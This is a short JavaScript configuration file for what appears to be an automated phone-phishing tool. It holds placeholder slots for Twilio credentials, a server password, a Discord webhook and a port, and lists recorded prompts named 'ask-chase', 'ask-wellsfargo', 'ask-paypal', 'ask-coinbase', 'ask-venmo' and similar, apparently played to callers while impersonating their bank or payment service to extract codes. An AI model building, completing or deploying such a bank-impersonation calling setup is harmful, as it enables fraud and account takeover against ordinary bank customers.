module.exports = {
    setupdone: 'true',

    /**
     * Information about the Twilio account
     */
    accountSid: 'ACCOUNT SID',
    authToken: 'AUTHTOKEN',
    callerid: 'TWILIO NUMBER',

    /**
     * Information about the API
     */
    apipassword: 'SERVERPASSWORD',
    serverurl: 'SERVERURL',

    /**
     * Information about the discord webhook
     */
    discordwebhook: 'WEBHOOK',

    /**
     * Port on which the express server is running
     */
    port: process.env.PORT || 1337,

    /**
     * Audio file storage paths
     */
     chasefilepath: './voice/en/chase/ask-chase.mp3',
     wellsfargofilepath: './voice/en/wellsfargo/ask-wellsfargo.mp3',
     bankofamericafilepath: './voice/en/bankofamerica/ask-bankofamerica.mp3',
     capitalonewalletfilepath: './voice/en/caponeap/ask-capitalone.mp3',
     paypalfilepath: './voice/en/paypal/ask-pp.mp3',
     chasewalletfilepath: './voice/en/chaseap/ask-chase.mp3',
     boawalletfilepath: './voice/en/boaap/ask-bankofamerica.mp3',
     wellsfargowalletfilepath: './voice/en/wellsfargoap/ask-wellsfargo.mp3',
     discoverwalletfilepath: './voice/en/discoverap/ask-discover.mp3',
     endfilepath: './voice/en/done/call-done.mp3',
     coinbasefilepath: './voice/en/coinbase/ask-coinbase.mp3',
     huntingtonfilepath: './voice/en/huntington/ask-huntington.mp3',
     venmofilepath: './voice/en/venmo/ask-venmo.mp3',
     twofilepath: './voice/en/two/ask-two.mp3',

    /**
     * SMS content according to the requested services
     */
    paypalsms: 'pp test 123'
};
